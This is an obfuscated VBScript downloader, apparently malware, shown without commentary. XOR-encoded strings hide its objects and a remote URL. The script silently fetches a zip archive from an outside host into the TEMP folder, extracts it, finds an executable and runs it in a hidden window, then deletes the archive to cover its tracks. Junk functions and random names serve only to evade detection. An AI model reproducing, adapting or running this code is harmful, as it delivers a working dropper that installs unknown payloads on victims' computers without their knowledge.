Option Explicit
Randomize

Function D(A)
    Dim i, s, k
    k = A(0)
    s = ""
    For i = 1 To UBound(A)
        s = s & Chr(A(i) Xor k)
    Next
    D = s
End Function

Function J()
    Dim i, b
    b = ""
    For i = 1 To 8
        b = b & Chr(97 + Int(Rnd * 26))
    Next
    J = b
End Function

Function ex9p(nc2mj)
    Dim sagn, zmhi4k
    nc2mj = nc2mj Xor 178
    sagn = (sagn - 734) Xor 138
    sagn = (sagn + 48) Xor 186
    sagn = (sagn Mod 59) Xor 180
    ex9p = nc2mj Mod 7
End Function

Dim tl2o, ooxdm, pnk, srk3wp, m9f, z2otgi, hyiz, h3ad, qoug6m, r55g, w3ku5, zh79, lkpt, wt, tg

Set tl2o = CreateObject(D(Array(87,4,52,37,62,39,35,62,57,48,121,17,62,59,50,4,46,36,35,50,58,24,53,61,50,52,35)))
Set ooxdm = CreateObject(D(Array(228,179,183,135,150,141,148,144,202,183,140,129,136,136)))

WScript.Sleep 2475
Call ex9p(596)

qoug6m = D(Array(125,21,9,9,13,14,71,82,82,28,31,22,28,19,21,26,83,30,18,16,82,26,20,9,21,8,31,83,7,20,13))
r55g = ooxdm.ExpandEnvironmentStrings(D(Array(160,133,225,240,240,228,225,244,225,133)))
w3ku5 = r55g & "\" & J() & D(Array(161,143,219,200,209))

Set pnk = CreateObject(D(Array(222,137,183,176,150,170,170,174,240,137,183,176,150,170,170,174,140,187,175,171,187,173,170,240,235,240,239)))
pnk.Open D(Array(57,126,124,109)), qoug6m, False
pnk.Send

Set srk3wp = CreateObject(D(Array(208,145,148,159,148,146,254,131,164,162,181,177,189)))
srk3wp.Type = 1
srk3wp.Open
srk3wp.Write pnk.ResponseBody
srk3wp.SaveToFile w3ku5, 2
srk3wp.Close

zh79 = r55g & "\" & J()
tl2o.CreateFolder zh79

Set m9f = CreateObject(D(Array(21,70,125,112,121,121,59,84,101,101,121,124,118,116,97,124,122,123)))
m9f.NameSpace(zh79).CopyHere m9f.NameSpace(w3ku5).Items, 16

h3ad = False
wt = 0
lkpt = D(Array(254,155,134,155))
Do While Not h3ad And wt < 90
    WScript.Sleep 1000
    wt = wt + 1
    If tl2o.FolderExists(zh79) Then
        Set z2otgi = tl2o.GetFolder(zh79)
        For Each hyiz In z2otgi.Files
            If LCase(tl2o.GetExtensionName(hyiz.Name)) = lkpt Then
                tg = hyiz.Path
                h3ad = True
                Exit For
            End If
        Next
    End If
Loop

If h3ad Then ooxdm.Run """" & tg & """", 0, False

WScript.Sleep 1291
tl2o.DeleteFile w3ku5
